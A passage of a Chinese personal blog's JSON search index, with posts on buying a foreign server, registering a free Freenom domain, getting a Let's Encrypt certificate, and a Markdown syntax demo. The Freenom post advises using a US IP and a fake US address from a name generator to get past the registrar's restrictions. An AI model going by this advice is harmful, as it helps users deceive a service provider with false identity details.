免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#证书自动更新-计划任务"},{"categories":["瞎折腾"],"content":"\r完工","date":"2020-09-03","objectID":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/:0:8","series":null,"tags":null,"title":"Let_s_Encrypt 免费Https证书","uri":"/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/#完工"},{"categories":["流水账"],"content":"​ 服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。 ​ 还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个项目，使用的技术大概就是反向代理+Https的协议，这里就不细讲了主要是害怕，可以自己到项目去看看。 ​ 在这里还学会了搞Let’s Encrypt的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。 ","date":"2020-09-02","objectID":"/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/:0:0","series":null,"tags":null,"title":"搭窝过程(二)","uri":"/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/#"},{"categories":["瞎折腾"],"content":"\r1.官网Freenom - 人人都熟悉的名字 官网右上角可以切换中文，简直了。 然后觉得我讲的有点啰嗦的还可以看油管上的freenom教学视频 ","date":"2020-09-02","objectID":"/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/:0:1","series":null,"tags":null,"title":"Freenom域名注册解析到服务器","uri":"/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/#1官网"},{"categories":["瞎折腾"],"content":"\r2.搜索想要的域名 ​ 搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。 ​ 我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是Hurricane Electric Hosted DNS，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑 接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。 点击continue按钮会提示注册，这里又有坑。 由于蝗虫一般涌入试图薅羊毛的中国人让 freenom 极度不爽, freenom 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 fakenamegenerator.com 胡诌个美国住址, 就可以随意注册免费域名了. ","date":"2020-09-02","objectID":"/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/:0:2","series":null,"tags":null,"title":"Freenom域名注册解析到服务器","uri":"/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/#2搜索想要的域名"},{"categories":["瞎折腾"],"content":"\r3.域名解析​ 完成以后点击Services–\u003eMy Domains进入域名管理页面。 点击域名后面的Manage Domain进入域名解析 ​ Nameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。 之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例： ","date":"2020-09-02","objectID":"/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/:0:3","series":null,"tags":null,"title":"Freenom域名注册解析到服务器","uri":"/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/#3域名解析"},{"categories":["流水账"],"content":" 备案劝退 很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息»\u003e阿里云审核通过»\u003e工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。 选择服务器 听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：vultr、搬瓦工、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的pacificrack,看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！ 域名注册 服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商freenom，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。 到这服务器和域名都搞定了。 ","date":"2020-09-02","objectID":"/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/:0:0","series":null,"tags":null,"title":"造窝过程(一)","uri":"/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/#"},{"categories":["流水账"],"content":"第一篇文章的内容 刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。 ","date":"2020-08-26","objectID":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/:0:0","series":null,"tags":null,"title":"第一篇文章","uri":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/#"},{"categories":null,"content":"这篇文章展示了基本的 Markdown 语法和格式.","date":"2019-12-01","objectID":"/posts/markdown/","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/"},{"categories":null,"content":"这篇文章提供了可以在 Hugo 的文章中使用的基本 Markdown 语法示例. 注意\r这篇文章借鉴了一篇很棒的来自 Grav 的文章. 如果你想了解 DoIt 主题的扩展 Markdown 语法, 请阅读扩展 Markdown 语法页面. 事实上, 编写 Web 内容很麻烦. WYSIWYG所见即所得 编辑器帮助减轻了这一任务. 但通常会导致代码太糟, 或更糟糕的是, 网页也会很丑. 没有通常伴随的所有复杂和丑陋的问题, Markdown 是一种更好的生成 HTML 内容的方式. 一些主要好处是: Markdown 简单易学, 几乎没有多余的字符, 因此编写内容也更快. 用 Markdown 书写时出错的机会更少. 可以产生有效的 XHTML 输出. 将内容和视觉显示保持分开, 这样就不会打乱网站的外观. 可以在你喜欢的任何文本编辑器或 Markdown 应用程序中编写内容. Markdown 使用起来很有趣! John Gruber, Markdown 的作者如是说: Markdown 格式的首要设计目标是更具可读性. 最初的想法是 Markdown 格式的文档应当以纯文本形式发布, 而不会看起来像被标签或格式说明所标记. 虽然 Markdown 的语法受到几种现有的文本到 HTML 转换工具的影响, 但 Markdown 语法的最大灵感来源是纯文本电子邮件的格式. – John Gruber 话不多说, 我们来回顾一下 Markdown 的主要语法以及生成的 HTML 样式! 技巧\r:(far fa-bookmark fa-fw): 将此页保存为书签，以备将来参考! ","date":"2019-12-01","objectID":"/posts/markdown/:0:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#"},{"categories":null,"content":"\r1 标题从 h2 到 h6 的标题在每个级别上都加上一个 ＃: markdown ## h2 标题 ### h3 标题 #### h4 标题 ##### h5 标题 ###### h6 标题\r输出的 HTML 看起来像这样: html \u003ch2\u003eh2 标题\u003c/h2\u003e \u003ch3\u003eh3 标题\u003c/h3\u003e \u003ch4\u003eh4 标题\u003c/h4\u003e \u003ch5\u003eh5 标题\u003c/h5\u003e \u003ch6\u003eh6 标题\u003c/h6\u003e\r标题 ID\r要添加自定义标题 ID, 请在与标题相同的行中将自定义 ID 放在花括号中: markdown ### 一个很棒的标题 {#custom-id}\r输出的 HTML 看起来像这样: html \u003ch3 id=\"custom-id\"\u003e一个很棒的标题\u003c/h3\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:1:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#1-标题"},{"categories":null,"content":"\r2 注释注释是和 HTML 兼容的： html \u003c!-- 这是一段注释 --\u003e\r不能看到以下的注释: ","date":"2019-12-01","objectID":"/posts/markdown/:2:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#2-注释"},{"categories":null,"content":"\r3 水平线HTML 中的 \u003chr\u003e 标签是用来在段落元素之间创建一个 “专题间隔” 的. 使用 Markdown, 你可以用以下方式创建一个 \u003chr\u003e 标签: ___: 三个连续的下划线 ---: 三个连续的破折号 ***: 三个连续的星号 呈现的输出效果如下: ","date":"2019-12-01","objectID":"/posts/markdown/:3:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#3-水平线"},{"categories":null,"content":"\r4 段落按照纯文本的方式书写段落, 纯文本在呈现的 HTML 中将用 \u003cp\u003e/\u003c/p\u003e 标签包裹. 如下段落: markdown Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.\r输出的 HTML 看起来像这样: html \u003cp\u003eLorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.\u003c/p\u003e\r可以使用一个空白行进行换行. ","date":"2019-12-01","objectID":"/posts/markdown/:4:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#4-段落"},{"categories":null,"content":"\r5 内联 HTML 元素如果你需要某个 HTML 标签 (带有一个类), 则可以简单地像这样使用: html Markdown 格式的段落. \u003cdiv class=\"class\"\u003e 这是 \u003cb\u003eHTML\u003c/b\u003e \u003c/div\u003e Markdown 格式的段落.\r","date":"2019-12-01","objectID":"/posts/markdown/:5:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#5-内联-html-元素"},{"categories":null,"content":"\r6 强调","date":"2019-12-01","objectID":"/posts/markdown/:6:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#6-强调"},{"categories":null,"content":"\r加粗用于强调带有较粗字体的文本片段. 以下文本片段会被 渲染为粗体. markdown **渲染为粗体** __渲染为粗体__\r输出的 HTML 看起来像这样: html \u003cstrong\u003e渲染为粗体\u003c/strong\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:6:1","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#加粗"},{"categories":null,"content":"\r斜体用于强调带有斜体的文本片段. 以下文本片段被 渲染为斜体. markdown *渲染为斜体* _渲染为斜体_\r输出的 HTML 看起来像这样: html \u003cem\u003e渲染为斜体\u003c/em\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:6:2","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#斜体"},{"categories":null,"content":"\r删除线按照 GFMGitHub flavored Markdown 你可以使用删除线. markdown ~~这段文本带有删除线.~~\r呈现的输出效果如下: 这段文本带有删除线. 输出的 HTML 看起来像这样: html \u003cdel\u003e这段文本带有删除线.\u003c/del\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:6:3","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#删除线"},{"categories":null,"content":"\r组合加粗, 斜体, 和删除线可以 组合使用. markdown ***加粗和斜体*** ~~**删除线和加粗**~~ ~~*删除线和斜体*~~ ~~***加粗, 斜体和删除线***~~\r呈现的输出效果如下: 加粗和斜体 删除线和加粗 删除线和斜体 加粗, 斜体和删除线 输出的 HTML 看起来像这样: html \u003cem\u003e\u003cstrong\u003e加粗和斜体\u003c/strong\u003e\u003c/em\u003e \u003cdel\u003e\u003cstrong\u003e删除线和加粗\u003c/strong\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e删除线和斜体\u003c/em\u003e\u003c/del\u003e \u003cdel\u003e\u003cem\u003e\u003cstrong\u003e加粗, 斜体和删除线\u003c/strong\u003e\u003c/em\u003e\u003c/del\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:6:4","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#组合"},{"categories":null,"content":"\r7 引用用于在文档中引用其他来源的内容块. 在要引用的任何文本之前添加 \u003e: markdown \u003e **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.\r呈现的输出效果如下: Fusion Drive combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. 输出的 HTML 看起来像这样: html \u003cblockquote\u003e \u003cp\u003e \u003cstrong\u003eFusion Drive\u003c/strong\u003e combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined. \u003c/p\u003e \u003c/blockquote\u003e\r引用也可以嵌套: markdown \u003e Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. \u003e\u003e Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.\r呈现的输出效果如下: Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue. Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi. Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam. ","date":"2019-12-01","objectID":"/posts/markdown/:7:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#7-引用"},{"categories":null,"content":"\r8 列表","date":"2019-12-01","objectID":"/posts/markdown/:8:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#8-列表"},{"categories":null,"content":"\r无序列表一系列项的列表, 其中项的顺序没有明显关系. 你可以使用以下任何符号来表示无序列表中的项: markdown * 一项内容 - 一项内容 + 一项内容\r例如: markdown * Lorem ipsum dolor sit amet * Consectetur adipiscing elit * Integer molestie lorem at massa * Facilisis in pretium nisl aliquet * Nulla volutpat aliquam velit * Phasellus iaculis neque * Purus sodales ultricies * Vestibulum laoreet porttitor sem * Ac tristique libero volutpat at * Faucibus porta lacus fringilla vel * Aenean sit amet erat nunc * Eget porttitor lorem\r呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Phasellus iaculis neque Purus sodales ultricies Vestibulum laoreet porttitor sem Ac tristique libero volutpat at Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: html \u003cul\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit \u003cul\u003e \u003cli\u003ePhasellus iaculis neque\u003c/li\u003e \u003cli\u003ePurus sodales ultricies\u003c/li\u003e \u003cli\u003eVestibulum laoreet porttitor sem\u003c/li\u003e \u003cli\u003eAc tristique libero volutpat at\u003c/li\u003e \u003c/ul\u003e \u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ul\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:8:1","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#无序列表"},{"categories":null,"content":"\r有序列表一系列项的列表, 其中项的顺序确实很重要. markdown 1. Lorem ipsum dolor sit amet 2. Consectetur adipiscing elit 3. Integer molestie lorem at massa 4. Facilisis in pretium nisl aliquet 5. Nulla volutpat aliquam velit 6. Faucibus porta lacus fringilla vel 7. Aenean sit amet erat nunc 8. Eget porttitor lorem\r呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: html \u003col\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit\u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ol\u003e\r技巧\r如果你对每一项使用 1., Markdown 将自动为每一项编号. 例如: markdown 1. Lorem ipsum dolor sit amet 1. Consectetur adipiscing elit 1. Integer molestie lorem at massa 1. Facilisis in pretium nisl aliquet 1. Nulla volutpat aliquam velit 1. Faucibus porta lacus fringilla vel 1. Aenean sit amet erat nunc 1. Eget porttitor lorem\r呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem ","date":"2019-12-01","objectID":"/posts/markdown/:8:2","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#有序列表"},{"categories":null,"content":"\r任务列表任务列表使你可以创建带有复选框的列表. 要创建任务列表, 请在任务列表项之前添加破折号 (-) 和带有空格的方括号 ([ ]). 要选择一个复选框，请在方括号之间添加 x ([x]). markdown - [x] Write the press release - [ ] Update the website - [ ] Contact the media\r呈现的输出效果如下: Write the press release Update the website Contact the media ","date":"2019-12-01","objectID":"/posts/markdown/:8:3","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#任务列表"},{"categories":null,"content":"\r9 代码","date":"2019-12-01","objectID":"/posts/markdown/:9:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#9-代码"},{"categories":null,"content":"\r行内代码用 ` 包装行内代码段. markdown 在这个例子中, `\u003csection\u003e\u003c/section\u003e` 会被包裹成 **代码**.\r呈现的输出效果如下: 在这个例子中, \u003csection\u003e\u003c/section\u003e 会被包裹成 代码. 输出的 HTML 看起来像这样: html \u003cp\u003e 在这个例子中, \u003ccode\u003e\u0026lt;section\u0026gt;\u0026lt;/section\u0026gt;\u003c/code\u003e 会被包裹成 \u003cstrong\u003e代码\u003c/strong\u003e. \u003c/p\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:9:1","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#行内代码"},{"categories":null,"content":"\r缩进代码将几行代码缩进至少四个空格，例如: markdown // Some comments line 1 of code line 2 of code line 3 of code\r呈现的输出效果如下: // Some comments line 1 of code line 2 of code line 3 of code 输出的 HTML 看起来像这样: html \u003cpre\u003e \u003ccode\u003e // Some comments line 1 of code line 2 of code line 3 of code \u003c/code\u003e \u003c/pre\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:9:2","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#缩进代码"},{"categories":null,"content":"\r围栏代码块使用 “围栏” ``` 来生成一段带有语言属性的代码块. ```markdown Sample text here... ``` 输出的 HTML 看起来像这样: html \u003cpre language-html\u003e \u003ccode\u003eSample text here...\u003c/code\u003e \u003c/pre\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:9:3","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#围栏代码块"},{"categories":null,"content":"\r语法高亮GFMGitHub Flavored Markdown 也支持语法高亮. 要激活它，只需在第一个代码 “围栏” 之后直接添加你要使用的语言的文件扩展名, ```js, 语法高亮显示将自动应用于渲染的 HTML 中. 例如, 在以下 JavaScript 代码中应用语法高亮: ```js grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; ``` 呈现的输出效果如下: js grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } };\r注意\rHugo 文档中的 语法高亮页面 介绍了有关语法高亮的更多信息, 包括语法高亮的 shortcode. ","date":"2019-12-01","objectID":"/posts/markdown/:9:4","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#语法高亮"},{"categories":null,"content":"\r10 表格通过在每个单元格之间添加竖线作为分隔线, 并在标题下添加一行破折号 (也由竖线分隔) 来创建表格. 注意, 竖线不需要垂直对齐. markdown | Option | Description | | ------ | ----------- | | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. |\r呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. 输出的 HTML 看起来像这样: html \u003ctable\u003e \u003cthead\u003e \u003ctr\u003e \u003cth\u003eOption\u003c/th\u003e \u003cth\u003eDescription\u003c/th\u003e \u003c/tr\u003e \u003c/thead\u003e \u003ctbody\u003e \u003ctr\u003e \u003ctd\u003edata\u003c/td\u003e \u003ctd\u003epath to data files to supply the data that will be passed into templates.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eengine\u003c/td\u003e \u003ctd\u003eengine to be used for processing templates. Handlebars is the default.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eext\u003c/td\u003e \u003ctd\u003eextension to be used for dest files.\u003c/td\u003e \u003c/tr\u003e \u003c/tbody\u003e \u003c/table\u003e\r文本右对齐或居中对齐\r在任何标题下方的破折号右侧添加冒号将使该列的文本右对齐. 在任何标题下方的破折号两边添加冒号将使该列的对齐文本居中. markdown | Option | Description | |:------:| -----------:| | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. |\r呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. ","date":"2019-12-01","objectID":"/posts/markdown/:10:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#10-表格"},{"categories":null,"content":"\r11 链接","date":"2019-12-01","objectID":"/posts/markdown/:11:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#links"},{"categories":null,"content":"\r基本链接\rmarkdown \u003chttps://assemble.io\u003e \u003ccontact@revolunet.com\u003e [Assemble](https://assemble.io)\r呈现的输出效果如下 (将鼠标悬停在链接上，没有提示): https://assemble.io contact@revolunet.com Assemble 输出的 HTML 看起来像这样: html \u003ca href=\"https://assemble.io\"\u003ehttps://assemble.io\u003c/a\u003e \u003ca href=\"mailto:contact@revolunet.com\"\u003econtact@revolunet.com\u003c/a\u003e \u003ca href=\"https://assemble.io\"\u003eAssemble\u003c/a\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:11:1","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#基本链接"},{"categories":null,"content":"\r添加一个标题\rmarkdown [Upstage](https://github.com/upstage/ \"Visit Upstage!\")\r呈现的输出效果如下 (将鼠标悬停在链接上，会有一行提示): Upstage 输出的 HTML 看起来像这样: html \u003ca href=\"https://github.com/upstage/\" title=\"Visit Upstage!\"\u003eUpstage\u003c/a\u003e\r","date":"2019-12-01","objectID":"/posts/markdown/:11:2","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#添加一个标题"},{"categories":null,"content":"\r定位标记定位标记使你可以跳至同一页面上的指定锚点. 例如, 每个章节: markdown ## Table of Contents * [Chapter 1](#chapter-1) * [Chapter 2](#chapter-2) * [Chapter 3](#chapter-3)\r将跳转到这些部分: markdown ## Chapter 1 \u003ca id=\"chapter-1\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 2 \u003ca id=\"chapter-2\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 3 \u003ca id=\"chapter-3\"\u003e\u003c/a\u003e Content for chapter one.\r注意\r定位标记的位置几乎是任意的. 因为它们并不引人注目, 所以它们通常被放在同一行了. ","date":"2019-12-01","objectID":"/posts/markdown/:11:3","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#定位标记"},{"categories":null,"content":"\r12 脚注脚注使你可以添加注释和参考, 而不会使文档正文混乱. 当你创建脚注时, 会在添加脚注引用的位置出现带有链接的上标编号. 读者可以单击链接以跳至页面底部的脚注内容. 要创建脚注引用, 请在方括号中添加插入符号和标识符 ([^1]). 标识符可以是数字或单词, 但不能包含空格或制表符. 标识符仅将脚注引用与脚注本身相关联 - 在脚注输出中, 脚注按顺序编号. 在中括号内使用插入符号和数字以及用冒号和文本来添加脚注内容 ([^1]：这是一段脚注). 你不一定要在文档末尾添加脚注. 可以将它们放在除列表, 引用和表格等元素之外的任何位置. markdown 这是一个数字脚注[^1]. 这是一个带标签的脚注[^label] [^1]: 这是一个数字脚注 [^label]: 这是一个带标签的脚注\r这是一个数字脚注1. 这是一个带标签的脚注2 ","date":"2019-12-01","objectID":"/posts/markdown/:12:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#12-脚注"},{"categories":null,"content":"\r13 图片图片的语法与链接相似, 但包含一个在前面的感叹号. markdown ![Minion](https://octodex.github.com/images/minion.png)\r或者: markdown ![Alt text](https://octodex.github.com/images/stormtroopocat.jpg \"The Stormtroopocat\")\rThe Stormtroopocat\r像链接一样, 图片也具有脚注样式的语法: markdown ![Alt text][id]\rThe Dojocat\r稍后在文档中提供参考内容, 用来定义 URL 的位置: markdown [id]: https://octodex.github.com/images/dojocat.jpg \"The Dojocat\"\r技巧\rDoIt 主题提供了一个包含更多功能的 图片的 shortcode. 这是一个数字脚注 ↩︎ 这是一个带标签的脚注 ↩︎ ","date":"2019-12-01","objectID":"/posts/markdown/:13:0","series":null,"tags":["Markdown","HTML"],"title":"Markdown 基本语法","uri":"/posts/markdown/#13-图片"}]